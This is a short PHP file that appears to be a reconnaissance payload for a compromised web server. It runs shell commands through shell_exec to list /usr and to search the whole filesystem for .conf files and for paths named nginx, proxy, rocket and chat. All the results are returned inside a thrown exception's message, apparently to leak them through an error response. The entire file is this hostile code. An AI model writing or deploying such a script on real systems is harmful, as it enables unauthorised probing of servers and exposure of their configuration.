<?php
$output ='';
$output =$output."\n /usr/... ".shell_exec (' ls /usr/ | xargs');
$output =$output."\n find .conf ".shell_exec (' find / -name "*.conf" | xargs');
$output =$output."\n find nginx ".shell_exec (' find / -name "nginx" | xargs');
$output =$output."\n find proxy ".shell_exec (' find / -name "proxy" | xargs');
$output =$output."\n find rocket ".shell_exec (' find / -name "rocket" | xargs');
$output =$output."\n find chat ".shell_exec (' find / -name "chat" | xargs');



throw new Exception("\n SUCCESS  ". $output."\n");
?>
